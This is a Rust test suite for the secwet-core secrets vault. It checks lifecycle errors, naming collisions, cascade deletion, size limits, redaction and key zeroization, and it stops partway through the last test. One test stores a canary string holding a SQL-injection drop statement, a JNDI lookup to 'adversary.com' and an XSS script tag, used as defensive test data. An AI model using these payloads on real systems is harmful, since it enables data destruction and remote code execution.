//! Adversarial challenge and stress test suite for secwet-core Secwet.
//!
//! Evaluates 8 adversarial challenge dimensions:
//! 1. Double `Secwet::create` attempt at the same directory (clean failure & duplicate prevention).
//! 2. Lifecycle sequence violations (uninitialized unlock, missing/corrupted keystore keys, state transitions).
//! 3. Case-insensitivity edge cases (trailing/leading spaces, mixed-case collisions, cross-entity rules).
//! 4. Cascade deletion invariant (deep hierarchy, deleted = 1, blob IS NULL, monotonic Lamport clocks).
//! 5. Last environment protection & multi-project isolation (strictly returns Error::LastEnvironment).
//! 6. Multiline secrets with Unicode, tabs, CR/LF, null bytes, special symbols, and 64 KiB boundary limits.
//! 7. Information leakage verification (`list_secrets`, `overview`, and `Debug` never expose full secrets).
//! 8. Zeroization witness (keys cleared to all zeroes when locked and on drop).

use secrecy::ExposeSecret;
use secwet_core::keys::{KeyStore, MemoryStore};
use secwet_core::{Error, SecretDraft, SecretKind, Secwet, SecwetStatus};
use tempfile::tempdir;

// ============================================================================
// 1. Double Secwet::create Attempt at the Same Directory
// ============================================================================

#[derive(Default)]
struct TrackingStore {
    entries: std::sync::RwLock<std::collections::HashMap<String, Vec<u8>>>,
}

impl KeyStore for TrackingStore {
    fn get(&self, entry: &str) -> secwet_core::Result<Option<secwet_core::keys::SecretVec<u8>>> {
        let map = self.entries.read().unwrap();
        Ok(map
            .get(entry)
            .cloned()
            .map(secwet_core::keys::SecretVec::new))
    }
    fn set(&self, entry: &str, value: &[u8]) -> secwet_core::Result<()> {
        let mut map = self.entries.write().unwrap();
        map.insert(entry.to_string(), value.to_vec());
        Ok(())
    }
    fn delete(&self, entry: &str) -> secwet_core::Result<()> {
        let mut map = self.entries.write().unwrap();
        map.remove(entry);
        Ok(())
    }
}

fn collect_paths(dir: &std::path::Path) -> Vec<std::path::PathBuf> {
    let mut paths = Vec::new();
    if let Ok(entries) = std::fs::read_dir(dir) {
        for entry in entries.flatten() {
            let p = entry.path();
            if p.is_dir() {
                paths.extend(collect_paths(&p));
            }
            paths.push(p);
        }
    }
    paths.sort();
    paths
}

/// Adversarial Challenge 1: Double `Secwet::create` attempt at the same directory.
///
/// Invariant: Creating a second secwet in an already-initialized data directory must not
/// silently create a duplicate or orphaned database. Must reject cleanly with `Error::AlreadyInitialized`,
/// leak zero keys to KeyStore, create zero directory/database artifacts, and leave the
/// existing secwet completely unharmed.
#[test]
fn challenge_double_create_attempt_clean_failure() {
    let dir = tempdir().expect("tempdir creation");
    let keystore = TrackingStore::default();

    // 1. Initial secwet creation
    let v1 = Secwet::create(dir.path(), "device-primary", &keystore)
        .expect("initial Secwet::create must succeed");
    let v1_id = v1.secwet_id();
    v1.lock();

    // Verify status is Locked
    let status = Secwet::status(dir.path()).expect("status check");
    assert_eq!(
        status,
        SecwetStatus::Locked { secwet_id: v1_id },
        "Directory must report Locked status for secwet 1"
    );

    // Snapshot keystore and filesystem state before duplicate attempt
    let mut keys_before: Vec<String> = keystore.entries.read().unwrap().keys().cloned().collect();
    keys_before.sort();
    assert_eq!(
        keys_before.len(),
        3,
        "Initial secwet creation must populate exactly 3 keys"
    );
    let fs_before = collect_paths(dir.path());

    // 2. Adversarial attempt 1: call Secwet::create again on the same directory while Locked
    let res = Secwet::create(dir.path(), "device-intruder", &keystore);

    // The specification dictates that double creation must fail cleanly rather than
    // creating a duplicate database that corrupts or shadows the existing secwet.
    assert!(
        matches!(res, Err(Error::AlreadyInitialized)),
        "Double Secwet::create at the same directory must fail with Error::AlreadyInitialized, but got {:?}",
        res.as_ref().map(|v| v.secwet_id())
    );

    // Verify zero keystore keys were leaked, added, or modified
    let mut keys_after: Vec<String> = keystore.entries.read().unwrap().keys().cloned().collect();
    keys_after.sort();
    assert_eq!(
        keys_before, keys_after,
        "Zero keystore keys must be leaked or modified on duplicate create attempt"
    );

    // Verify zero directory or file artifacts were leaked on disk
    let fs_after = collect_paths(dir.path());
    assert_eq!(
        fs_before, fs_after,
        "Zero files or directories must be created on duplicate create attempt"
    );

    // 3. Verify original secwet remains uncorrupted and unlockable
    let v1_unlocked = Secwet::unlock(dir.path(), &keystore)
        .expect("v1 must remain cleanly unlockable after rejected duplicate create attempt");
    assert_eq!(v1_unlocked.secwet_id(), v1_id);

    // Snapshot state while unlocked (note: SQLite WAL mode opens -wal/-shm files for v1)
    let mut keys_before2: Vec<String> = keystore.entries.read().unwrap().keys().cloned().collect();
    keys_before2.sort();
    assert_eq!(keys_before, keys_before2);
    let fs_before2 = collect_paths(dir.path());

    // 4. Adversarial attempt 2: call Secwet::create again while Unlocked
    let res2 = Secwet::create(dir.path(), "device-intruder-2", &keystore);
    assert!(
        matches!(res2, Err(Error::AlreadyInitialized)),
        "Double Secwet::create while unlocked must fail with Error::AlreadyInitialized, but got {:?}",
        res2.as_ref().map(|v| v.secwet_id())
    );

    // Verify still zero keystore leaks and zero disk leaks
    let mut keys_after2: Vec<String> = keystore.entries.read().unwrap().keys().cloned().collect();
    keys_after2.sort();
    assert_eq!(
        keys_before2, keys_after2,
        "Zero keystore keys must be leaked when create fails on unlocked secwet"
    );
    let fs_after2 = collect_paths(dir.path());
    assert_eq!(
        fs_before2, fs_after2,
        "Zero disk artifacts must be created when create fails on unlocked secwet"
    );

    // 5. Adversarial attempt 3: flat database layout (data_dir/secwet.sqlite3)
    let dir_flat = tempdir().expect("tempdir creation");
    let flat_db_dest = dir_flat.path().join("secwet.sqlite3");
    let orig_db = dir
        .path()
        .join("secwet")
        .join(v1_id.to_string())
        .join("secwet.sqlite3");
    std::fs::copy(&orig_db, &flat_db_dest).expect("copy flat db");
    let res3 = Secwet::create(dir_flat.path(), "device-intruder-3", &keystore);
    assert!(
        matches!(res3, Err(Error::AlreadyInitialized)),
        "Secwet::create with flat layout must fail with Error::AlreadyInitialized, but got {:?}",
        res3.as_ref().map(|v| v.secwet_id())
    );
}

// ============================================================================
// 2. Lifecycle Sequence Violations & Keystore Corruption
// ============================================================================

/// Adversarial Challenge 2: Lifecycle sequence violations.
///
/// Verifies:
/// - Unlocking uninitialized directory fails with `Error::NoSecwet`.
/// - Unlocking with missing keystore keys fails with `Error::KeyStore`.
/// - Unlocking with wrong-length key bytes fails with `Error::KeyStore`.
/// - Unlocking with corrupted 32-byte key fails cleanly on read operations with `Error::Crypto`.
/// - State machine transitions between Uninitialized, Unlocked, and Locked.
#[test]
fn challenge_lifecycle_sequence_violations() {
    let dir = tempdir().expect("tempdir creation");
    let keystore = MemoryStore::new();

    // 1. Attempting to unlock uninitialized directory
    let res = Secwet::unlock(dir.path(), &keystore);
    assert!(
        matches!(res, Err(Error::NotInitialized)),
        "Unlocking uninitialized directory must return Error::NotInitialized"
    );

    // 2. Create secwet
    let mut secwet = Secwet::create(dir.path(), "device-laptop", &keystore).expect("create");
    let secwet_id = secwet.secwet_id();
    assert_eq!(
        secwet.current_status(),
        SecwetStatus::Unlocked { secwet_id },
        "Created secwet must report Unlocked status"
    );
    secwet
        .create_project("Initial Project", &[])
        .expect("create project");
    secwet.lock();

    // Status after lock must be Locked
    assert_eq!(
        Secwet::status(dir.path()).expect("status"),
        SecwetStatus::Locked { secwet_id },
        "Secwet status after lock must be Locked"
    );

    // 3. Attempting to unlock with completely empty keystore
    let empty_keystore = MemoryStore::new();
    let res = Secwet::unlock(dir.path(), &empty_keystore);
    assert!(
        matches!(res, Err(Error::KeyStore)),
        "Unlocking with missing keystore key must return Error::KeyStore"
    );

    // 4. Attempting to unlock with corrupted key length (e.g. 16 bytes instead of 32)
    let bad_len_keystore = MemoryStore::new();
    bad_len_keystore
        .set(&format!("secwet/{secwet_id}/master-key/1"), &[0xAA; 16])
        .unwrap();
    let res = Secwet::unlock(dir.path(), &bad_len_keystore);
    assert!(
        matches!(res, Err(Error::KeyStore)),
        "Unlocking with non-32-byte key must return Error::KeyStore"
    );

    // 5. Attempting to unlock with corrupted 32-byte key (incorrect key data)
    let corrupted_key_store = MemoryStore::new();
    corrupted_key_store
        .set(&format!("secwet/{secwet_id}/master-key/1"), &[0xFF; 32])
        .unwrap();
    let res = Secwet::unlock(dir.path(), &corrupted_key_store);
    // If unlock opens the connection, any read operation must fail with Error::Crypto
    if let Ok(corrupt_secwet) = res {
        assert!(
            matches!(corrupt_secwet.list_projects(), Err(Error::Crypto)),
            "Reading projects with corrupted key must return Error::Crypto"
        );
        assert!(
            matches!(corrupt_secwet.overview(), Err(Error::Crypto)),
            "Overview with corrupted key must return Error::Crypto"
        );
        corrupt_secwet.lock();
    }

    // 6. Legitimate unlock restores full functionality
    let mut legitimate_secwet =
        Secwet::unlock(dir.path(), &keystore).expect("unlock with valid keys");
    assert_eq!(
        Secwet::status(dir.path()).expect("status"),
        SecwetStatus::Unlocked { secwet_id }
    );
    legitimate_secwet
        .create_project("Project Alpha", &[])
        .expect("create project");
    assert_eq!(
        legitimate_secwet.list_projects().expect("list").len(),
        2,
        "Legitimate secwet must decrypt records cleanly"
    );

    // 7. Drop without calling lock must transition status to Locked
    drop(legitimate_secwet);
    assert_eq!(
        Secwet::status(dir.path()).expect("status"),
        SecwetStatus::Locked { secwet_id },
        "Dropping Secwet instance must transition status to Locked"
    );
}

// ============================================================================
// 3. Case-Insensitivity & Whitespace Edge Cases
// ============================================================================

/// Adversarial Challenge 3: Case-insensitivity, leading/trailing whitespace, and collision rules.
///
/// Verifies:
/// - Project names: trimmed, case-insensitive uniqueness per secwet.
/// - Duplicate project creation/renaming with varied casing or spaces is rejected.
/// - Project self-rename with case change is allowed.
/// - Environments: trimmed, case-insensitive uniqueness within their project.
/// - Duplicate environments within the same project are rejected.
/// - Different projects CAN have identically named environments.
/// - Secret names: strictly CASE-SENSITIVE uniqueness within environment.
/// - Secret names: whitespace is strictly forbidden by regex `^[A-Za-z_][A-Za-z0-9_.@-]*$`.
#[test]
fn challenge_case_insensitivity_and_whitespace_edge_cases() {
    let dir = tempdir().expect("tempdir");
    let keystore = MemoryStore::new();
    let mut secwet = Secwet::create(dir.path(), "device-test", &keystore).unwrap();

    // 1. Create project with leading and trailing spaces
    let p1 = secwet
        .create_project("   Core Infrastructure   ", &[])
        .expect("project with whitespace");
    assert_eq!(p1.name, "Core Infrastructure", "Name must be trimmed");

    // 2. Collisions with varied casing and whitespace
    for collision_attempt in [
        "core infrastructure",
        "CORE INFRASTRUCTURE",
        "  core infrastructure  ",
        "cOrE InFrAsTrUcTuRe",
        "   Core Infrastructure   ",
    ] {
        let res = secwet.create_project(collision_attempt, &[]);
        assert!(
            matches!(res, Err(Error::Duplicate { field: "name" })),
            "Expected Error::Duplicate for '{collision_attempt}'"
        );
    }

    // 3. Second project creation
    let p2 = secwet
        .create_project("Billing Service", &[])
        .expect("second project");

    // Attempting to rename p2 to p1's name (case-insensitive) must fail
    let res = secwet.rename_project(p2.id, "  core infrastructure  ");
    assert!(
        matches!(res, Err(Error::Duplicate { field: "name" })),
        "Renaming to existing project name with varied case must return Duplicate"
    );

    // Self-rename with case change is allowed (e.g. "Core Infrastructure" -> "Core infrastructure")
    secwet
        .rename_project(p1.id, "  Core infrastructure  ")
        .expect("self-rename with case adjustment must succeed");
    let projects = secwet.list_projects().unwrap();
    let updated_p1 = projects.iter().find(|p| p.id == p1.id).unwrap();
    assert_eq!(updated_p1.name, "Core infrastructure");

    // 4. Duplicate environments in initial creation slice
    let res = secwet.create_project(
        "Invalid Envs Project",
        &[
            "Development".to_string(),
            "  development  ".to_string(),
            "Production".to_string(),
        ],
    );
    assert!(
        matches!(res, Err(Error::Duplicate { field: "name" })),
        "Duplicate environments in create_project slice must return Duplicate"
    );

    // 5. Adding environment with case-insensitive collision in existing project
    // p1 has default environments: ["Development", "Staging", "Production"]
    for env_collision in ["development", "DEVELOPMENT", "  DeVeLoPmEnT  "] {
        let res = secwet.add_environment(p1.id, env_collision);
        assert!(
            matches!(res, Err(Error::Duplicate { field: "name" })),
            "Adding environment colliding with existing env must return Duplicate: '{env_collision}'"
        );
    }

    // 6. Cross-project environment non-collision:
    // Both p1 and p2 have "Development" environment; they must coexist cleanly
    let p1_dev = p1
        .environments
        .iter()
        .find(|e| e.name == "Development")
        .unwrap();
    let p2_dev = p2
        .environments
        .iter()
        .find(|e| e.name == "Development")
        .unwrap();
    assert_ne!(
        p1_dev.id, p2_dev.id,
        "Environments in different projects have independent IDs"
    );

    // 7. Secret names: CASE-SENSITIVE uniqueness within the same environment
    let s_upper = secwet
        .create_secret(SecretDraft::new(
            p1.id,
            p1_dev.id,
            "DATABASE_URL",
            SecretKind::EnvVar,
            "postgres://user:pass@host1/db",
            None,
        ))
        .expect("create DATABASE_URL");

    let s_lower = secwet
        .create_secret(SecretDraft::new(
            p1.id,
            p1_dev.id,
            "database_url",
            SecretKind::EnvVar,
            "postgres://user:pass@host2/db",
            None,
        ))
        .expect("create database_url (case-sensitive unique)");

    assert_ne!(
        s_upper.id, s_lower.id,
        "CASE-SENSITIVE: DATABASE_URL and database_url must be distinct secrets"
    );

    // Duplicate exact case must fail
    let res = secwet.create_secret(SecretDraft::new(
        p1.id,
        p1_dev.id,
        "DATABASE_URL",
        SecretKind::EnvVar,
        "other",
        None,
    ));
    assert!(
        matches!(res, Err(Error::Duplicate { field: "name" })),
        "Exact case secret duplicate must fail with Error::Duplicate"
    );

    // 8. Secret name whitespace rejection
    for invalid_name in [
        " DATABASE_URL",
        "DATABASE_URL ",
        " DATABASE_URL ",
        "DATA BASE",
        "DB\nURL",
    ] {
        let res = secwet.create_secret(SecretDraft::new(
            p1.id,
            p1_dev.id,
            invalid_name,
            SecretKind::EnvVar,
            "value",
            None,
        ));
        assert!(
            matches!(res, Err(Error::Invalid { field: "name", .. })),
            "Secret name with whitespace '{invalid_name}' must return Error::Invalid"
        );
    }
}

// ============================================================================
// 4. Cascade Deletion Invariant & Database Tombstone Verification
// ============================================================================

/// Adversarial Challenge 4: Deep cascade deletion hierarchy and database tombstone integrity.
///
/// Invariant: Deleting a project must atomically soft-delete the project, all its child
/// environments, and all grandchild secrets. In SQLite:
/// - `deleted = 1`
/// - `blob IS NULL`
/// - Lamport clock incremented monotonically.
#[test]
fn challenge_cascade_deletion_deep_hierarchy_and_tombstone_invariants() {
    let dir = tempdir().expect("tempdir");
    let keystore = MemoryStore::new();
    let mut secwet = Secwet::create(dir.path(), "device-cascade", &keystore).unwrap();

    // 1. Build deep hierarchy:
    // Project P1 -> 3 Environments (Dev, Staging, Prod) -> 6 Secrets (3 in Dev, 2 in Staging, 1 in Prod)
    let p = secwet
        .create_project(
            "E-Commerce Platform",
            &[
                "Development".to_string(),
                "Staging".to_string(),
                "Production".to_string(),
            ],
        )
        .unwrap();
    let env_dev = p.environments[0].id;
    let env_staging = p.environments[1].id;
    let env_prod = p.environments[2].id;

    let s1 = secwet
        .create_secret(SecretDraft::new(
            p.id,
            env_dev,
            "DEV_DB_URL",
            SecretKind::EnvVar,
            "val1",
            None,
        ))
        .unwrap();
    let s2 = secwet
        .create_secret(SecretDraft::new(
            p.id,
            env_dev,
            "DEV_API_KEY",
            SecretKind::ApiKey,
            "val2",
            None,
        ))
        .unwrap();
    let s3 = secwet
        .create_secret(SecretDraft::new(
            p.id,
            env_dev,
            "DEV_SECRET",
            SecretKind::Password,
            "val3",
            None,
        ))
        .unwrap();

    let s4 = secwet
        .create_secret(SecretDraft::new(
            p.id,
            env_staging,
            "STAGING_DB_URL",
            SecretKind::EnvVar,
            "val4",
            None,
        ))
        .unwrap();
    let s5 = secwet
        .create_secret(SecretDraft::new(
            p.id,
            env_staging,
            "STAGING_API_KEY",
            SecretKind::ApiKey,
            "val5",
            None,
        ))
        .unwrap();

    let s6 = secwet
        .create_secret(SecretDraft::new(
            p.id,
            env_prod,
            "PROD_MASTER_KEY",
            SecretKind::Password,
            "val6",
            None,
        ))
        .unwrap();

    let all_record_ids = [
        p.id,
        env_dev,
        env_staging,
        env_prod,
        s1.id,
        s2.id,
        s3.id,
        s4.id,
        s5.id,
        s6.id,
    ];

    // Read initial Lamport clocks
    let mut pre_lamports = std::collections::HashMap::new();
    for &id in &all_record_ids {
        let (del, blob_opt, lamp): (i32, Option<Vec<u8>>, i64) = secwet
            .db_connection()
            .query_row(
                "SELECT deleted, blob, lamport FROM records WHERE id = ?1",
                rusqlite::params![id.as_bytes().as_slice()],
                |row| Ok((row.get(0)?, row.get(1)?, row.get(2)?)),
            )
            .unwrap();
        assert_eq!(del, 0, "Record must initially be active");
        assert!(blob_opt.is_some(), "Active record must have non-null blob");
        pre_lamports.insert(id, lamp);
    }

    // 2. Cascade delete project
    secwet.delete_project(p.id).expect("delete_project cascade");

    // 3. Inspect raw SQLite records table for all 10 records
    for &id in &all_record_ids {
        let (deleted, blob_opt, post_lamport): (i32, Option<Vec<u8>>, i64) = secwet
            .db_connection()
            .query_row(
                "SELECT deleted, blob, lamport FROM records WHERE id = ?1",
                rusqlite::params![id.as_bytes().as_slice()],
                |row| Ok((row.get(0)?, row.get(1)?, row.get(2)?)),
            )
            .unwrap();

        assert_eq!(
            deleted, 1,
            "Record {} must have deleted = 1 after cascade deletion",
            id
        );
        assert!(
            blob_opt.is_none(),
            "Record {} must have blob IS NULL after cascade deletion (tombstone)",
            id
        );
        let pre_lamp = pre_lamports[&id];
        assert!(
            post_lamport > pre_lamp,
            "Lamport clock for record {} must increment monotonically on cascade delete (pre: {}, post: {})",
            id, pre_lamp, post_lamport
        );
    }

    // 4. API layer reflects deletion
    assert!(secwet.list_projects().unwrap().is_empty());
    assert!(matches!(
        secwet.list_environment_secrets(env_dev),
        Err(Error::NotFound)
    ));
    assert!(matches!(secwet.reveal_secret(s1.id), Err(Error::NotFound)));
    assert!(matches!(
        secwet.env_for_environment(env_dev),
        Err(Error::NotFound)
    ));

    let overview = secwet.overview().unwrap();
    assert_eq!(overview.projects_count, 0);
    assert_eq!(overview.environments_count, 0);
    assert_eq!(overview.secrets_count, 0);
    assert!(overview.recent.is_empty());

    // 5. Idempotent deletion fails with NotFound
    assert!(matches!(secwet.delete_project(p.id), Err(Error::NotFound)));
}

// ============================================================================
// 5. Last Environment Protection & Multi-Project Isolation
// ============================================================================

/// Adversarial Challenge 5: Last environment protection and cross-project isolation.
///
/// Invariant: An environment cannot be deleted if it is the last remaining active
/// environment in its parent project (`Error::LastEnvironment`). Multi-project counts
/// must never cross-pollinate.
#[test]
fn challenge_last_environment_protection_and_project_isolation() {
    let dir = tempdir().expect("tempdir");
    let keystore = MemoryStore::new();
    let mut secwet = Secwet::create(dir.path(), "device-lastenv", &keystore).unwrap();

    // 1. Create Project A with 2 environments
    let p_a = secwet
        .create_project(
            "Project A",
            &["Env Alpha".to_string(), "Env Beta".to_string()],
        )
        .unwrap();
    let env_alpha = p_a.environments[0].id;
    let env_beta = p_a.environments[1].id;

    // 2. Create Project B with 1 environment
    let p_b = secwet
        .create_project("Project B", &["Env Solo".to_string()])
        .unwrap();
    let env_solo = p_b.environments[0].id;

    // Delete Env Alpha from Project A -> succeeds (Env Beta remains)
    secwet
        .delete_environment(env_alpha)
        .expect("deleting non-last environment");

    // Attempting to delete Env Beta (now the last in Project A) must fail strictly
    let res = secwet.delete_environment(env_beta);
    assert!(
        matches!(res, Err(Error::LastEnvironment)),
        "Deleting the final environment in Project A must return Error::LastEnvironment"
    );

    // Verify Env Beta is still active in SQLite
    let deleted: i32 = secwet
        .db_connection()
        .query_row(
            "SELECT deleted FROM records WHERE id = ?1",
            rusqlite::params![env_beta.as_bytes().as_slice()],
            |r| r.get(0),
        )
        .unwrap();
    assert_eq!(deleted, 0, "Env Beta must remain active");

    // Attempting to delete Env Solo in Project B must fail strictly (it's the only one in Project B)
    let res_b = secwet.delete_environment(env_solo);
    assert!(
        matches!(res_b, Err(Error::LastEnvironment)),
        "Deleting only environment in Project B must return Error::LastEnvironment"
    );

    // Add a new environment to Project A -> now 2 environments again
    let env_gamma = secwet
        .add_environment(p_a.id, "Env Gamma")
        .expect("add env gamma");

    // Now Env Beta can be deleted since Env Gamma exists
    secwet
        .delete_environment(env_beta)
        .expect("delete env beta now that gamma exists");

    // Now Env Gamma is the last environment in Project A -> deleting must fail
    let res_gamma = secwet.delete_environment(env_gamma.id);
    assert!(
        matches!(res_gamma, Err(Error::LastEnvironment)),
        "Env Gamma is now the last environment in Project A; deleting must return Error::LastEnvironment"
    );
}

// ============================================================================
// 6. Multiline Secrets, Unicode, Null Bytes, and 64 KiB Size Boundaries
// ============================================================================

/// Adversarial Challenge 6: Multiline secrets, Unicode scripts, null bytes, special symbols,
/// and maximum size boundary enforcement (up to 64 KiB).
#[test]
fn challenge_multiline_secrets_unicode_null_bytes_and_size_limits() {
    let dir = tempdir().expect("tempdir");
    let keystore = MemoryStore::new();
    let mut secwet = Secwet::create(dir.path(), "device-secrets", &keystore).unwrap();

    let p = secwet.create_project("Crypto Services", &[]).unwrap();
    let env_id = p.environments[0].id;

    // 1. Multiline secret with Unicode scripts, emojis with ZWJ, tabs, CRLF, and embedded null bytes
    let complex_canary = "-----BEGIN SECWET ADVERSARIAL PRIVATE KEY-----\r\n\
         CJK_Kana: こんにちは世界_プログラミング_1234\n\
         Cyrillic: СекретныйКлючДоступа_9876\r\n\
         Arabic: كلمة_مرور_سرية_للغاية\n\
         Hebrew: סיסמה סודית ביותר עם תווים מיוחדים\r\n\
         Greek: ΜυστικόΚλειδίΑσφαλείας_Ωμέγα\n\
         Emojis: 🔐_🛡️_👩‍💻_🚀_👨‍👩‍👧‍👦_✨\r\n\
         TabsAndControl: \t\t\t\t\x0c\r\n\
         EmbeddedNullBytes: Header\0Payload\0Trailer\0End\n\
         InjectionPayload: ' OR 1=1; DROP TABLE records; --\r\n\
         ${jndi:ldap://adversary.com/payload}\n\
         <script>alert('xss');</script>\r\n\
         -----END SECWET ADVERSARIAL PRIVATE KEY-----\n"
        .to_string();

    let draft = SecretDraft::new(
        p.id,
        env_id,
        "COMPLEX_CANARY_KEY",
        SecretKind::SshKey,
        &complex_canary,
        Some("Adversarial multi-script secret with tabs and null bytes".to_string()),
    );
    let meta = secwet.create_secret(draft).expect("create complex secret");

    let revealed = secwet.reveal_secret(meta.id).expect("reveal complex secret");
    assert_eq!(
        revealed.expose_secret(),
        &complex_canary,
        "Revealed secret must match complex canary byte-for-byte including null bytes and CRLF"
    );

    // Verify env_for also returns exact secret
    let pairs = secwet.env_for_environment(env_id).expect("env_for");
    let found = pairs
        .iter()
        .find(|(k, _)| k == "COMPLEX_CANARY_KEY")
        .unwrap();
    assert_eq!(found.1.expose_secret(), &complex_canary);

    // 2. Exact 64 KiB (65,536 bytes) payload
    let mut exact_64kib = String::with_capacity(65536);
    let block = "Line:0123456789_abcdefghijklmnopqrstuvwxyz_!@#$%^&*()_+=~`{}[]\r\n";
    while exact_64kib.len() + block.len() <= 65536 {
        exact_64kib.push_str(block);
    }
    // Pad exactly to 65,536 bytes
    while exact_64kib.len() < 65536 {
        exact_64kib.push('A');
    }
    assert_eq!(exact_64kib.len(), 65536, "Payload must be exactly 64 KiB");

    let draft_64kib = SecretDraft::new(
        p.id,
        env_id,
        "EXACT_64KIB_SECRET",
        SecretKind::Certificate,
        &exact_64kib,
        None,
    );
    let meta_64kib = secwet
        .create_secret(draft_64kib)
        .expect("64 KiB secret creation must succeed");

    let revealed_64kib = secwet
        .reveal_secret(meta_64kib.id)
        .expect("reveal 64 KiB secret");
    assert_eq!(
        revealed_64kib.expose_secret().len(),
        65536,
        "Revealed size must be exactly 65,536 bytes"
    );
    assert_eq!(revealed_64kib.expose_secret(), &exact_64kib);

    // 3. 64 KiB + 1 byte (65,537 bytes) must fail validation
    let mut oversized = exact_64kib.clone();
    oversized.push('X');
    assert_eq!(oversized.len(), 65537);

    let draft_oversized = SecretDraft::new(
        p.id,
        env_id,
        "OVERSIZED_SECRET",
        SecretKind::Password,
        oversized,
        None,
    );
    let res_oversized = secwet.create_secret(draft_oversized);
    assert!(
        matches!(res_oversized, Err(Error::Invalid { field: "value", .. })),
        "Creating 65,537 byte secret must fail with Error::Invalid {{ field: 'value' }}"
    );

    // 4. Empty secret value must fail validation
    let draft_empty =
        SecretDraft::new(p.id, env_id, "EMPTY_SECRET", SecretKind::Password, "", None);
    let res_empty = secwet.create_secret(draft_empty);
    assert!(
        matches!(res_empty, Err(Error::Invalid { field: "value", .. })),
        "Empty secret value must fail with Error::Invalid {{ field: 'value' }}"
    );

    // 5. Updating an existing secret to a new 64 KiB payload
    let mut updated_64kib = String::with_capacity(65536);
    let block2 = "Updated_Chunk:0987654321_ZYXWVUTSRQPONMLKJIHGFEDCBA_<>?:|{\r\n";
    while updated_64kib.len() + block2.len() <= 65536 {
        updated_64kib.push_str(block2);
    }
    while updated_64kib.len() < 65536 {
        updated_64kib.push('Z');
    }
    assert_eq!(updated_64kib.len(), 65536);

    let update_draft = SecretDraft::new(
        p.id,
        env_id,
        "COMPLEX_CANARY_KEY",
        SecretKind::ApiKey,
        &updated_64kib,
        Some("Updated to 64 KiB payload".to_string()),
    );
    secwet
        .update_secret(meta.id, update_draft)
        .expect("update secret to 64 KiB");

    let revealed_updated = secwet.reveal_secret(meta.id).expect("reveal updated");
    assert_eq!(revealed_updated.expose_secret(), &updated_64kib);
}

// ============================================================================
// 7. Information Leakage Verification
// ============================================================================

/// Adversarial Challenge 7: Information leakage prevention in `list_secrets` and `overview`.
///
/// Invariant: Secret values are NEVER exposed in lists, overviews, logs, error messages,
/// or serialized view models (only the 4-char non-whitespace `value_tail` is exposed in `SecretMeta`).
#[test]
fn challenge_information_leakage_in_listings_and_overview() {
    let dir = tempdir().expect("tempdir");
    let keystore = MemoryStore::new();
    let mut secwet = Secwet::create(dir.path(), "device-leak-check", &keystore).unwrap();

    let p = secwet.create_project("Leak Prevention Test", &[]).unwrap();
    let env_id = p.environments[0].id;

    let sensitive_canary = "SUPER_SECRET_TOKEN_CANARY_VALUE_XYZ_DO_NOT_LEAK_9876";
    let sensitive_prefix = "SUPER_SECRET_TOKEN_CANARY_VALUE_XYZ_DO_NOT_LEAK";
    let expected_tail = "9876";

    let draft = SecretDraft::new(
        p.id,
        env_id,
        "PRODUCTION_SECRET_KEY",
        SecretKind::ApiKey,
        sensitive_canary,
        Some("Sensitive note that is safe to view".to_string()),
    );

    // Check SecretDraft Debug redaction
    let draft_debug = format!("{:?}", draft);
    assert!(
        !draft_debug.contains(sensitive_prefix),
        "SecretDraft Debug output must redact secret value: {draft_debug}"
    );
    assert!(
        draft_debug.contains("[REDACTED]"),
        "SecretDraft Debug output must contain [REDACTED]"
    );

    let created_meta = secwet.create_secret(draft).unwrap();
    assert_eq!(
        created_meta.value_tail, expected_tail,
        "value_tail must be exactly the last 4 characters"
    );

    // 1. Check list_secrets
    let secrets = secwet.list_environment_secrets(env_id).unwrap();
    assert_eq!(secrets.len(), 1);
    let secret_meta = &secrets[0];

    // Debug representation
    let meta_debug = format!("{:?}", secret_meta);
    assert!(
        !meta_debug.contains(sensitive_prefix),
        "SecretMeta Debug output must not contain sensitive prefix"
    );

    // JSON serialization
    let meta_json = serde_json::to_string(secret_meta).unwrap();
    assert!(
        !meta_json.contains(sensitive_prefix),
        "SecretMeta JSON output must not contain sensitive prefix"
    );
    assert!(
        meta_json.contains(r#""value_tail":"9876""#),
        "SecretMeta JSON must contain value_tail"
    );

    // Postcard serialization
    let meta_bytes = postcard::to_stdvec(secret_meta).unwrap();
    let found_in_postcard = meta_bytes
        .windows(sensitive_prefix.len())
        .any(|window| window == sensitive_prefix.as_bytes());
    assert!(
        !found_in_postcard,
        "SecretMeta Postcard output must not contain sensitive prefix"
    );

    // 2. Check overview
    let overview = secwet.overview().unwrap();
    assert_eq!(overview.secrets_count, 1);
    assert_eq!(overview.recent.len(), 1);

    // Debug representation
    let overview_debug = format!("{:?}", overview);
    assert!(
        !overview_debug.contains(sensitive_prefix),
        "Overview Debug output must not contain sensitive prefix"
    );

    // JSON serialization
    let overview_json = serde_json::to_string(&overview).unwrap();
    assert!(
        !overview_json.contains(sensitive_prefix),
        "Overview JSON output must not contain sensitive prefix"
    );

    // Overview recent secret struct does not have any value field
    let recent = &overview.recent[0];
    assert_eq!(recent.name, "PRODUCTION_SECRET_KEY");
    assert_eq!(recent.project_name, "Leak Prevention Test");
    assert_eq!(recent.environment_name, "Development");
}

// ============================================================================
// 8. Zeroization Witness
// ============================================================================

/// Adversarial Challenge 8: Zeroization witness verification on `lock()` and `drop()`.
///
/// Invariant: Memory buffers holding decrypted runtime keys (`k_rec` and `k_evt`)
/// must be cleared to all zeroes when locked and when the Secwet instance is dropped.
#[test]
fn challenge_zeroization_witness_on_lock_and_drop() {
    let dir = tempdir().expect("tempdir");
    let keystore = MemoryStore::new();

    // 1. Create secwet and obtain witness handles
    let secwet = Secwet::create(dir.path(), "device-zeroize", &keystore).unwrap();
    let k_rec_witness = secwet.test_k_rec_witness();
    let k_evt_witness = secwet.test_k_evt_witness();

    // While unlocked, key buffers must be non-zero
    {
        let rec = k_rec_witness.lock().unwrap();
        let evt = k_evt_witness.lock().unwrap();
        assert_ne!(
            *rec, [0u8; 32],
            "k_rec witness buffer must be non-zero while secwet is unlocked"
        );
        assert_ne!(
            *evt, [0u8; 32],
            "k_evt witness buffer must be non-zero while secwet is unlocked"
        );
    }

    // Explicitly lock secwet
    secwet.lock();

    // After lock(), witness buffers must be zeroized to all zeroes
    {
        let rec = k_rec_witness.lock().unwrap();
        let evt = k_evt_witness.lock().unwrap();
        assert_eq!(
            *rec, [0u8; 32],
            "k_rec witness buffer must be zeroized to all 0x00 upon lock()"
        );
        assert_eq!(
            *evt, [0u8; 32],
            "k_evt witness buffer must be zeroized to all 0x00 upon lock()"
        );
    }

    // 2. Re-unlock secwet and verify zeroization on Drop
    let unlocked_secwet = Secwet::unlock(dir.path(), &keystore).unwrap();
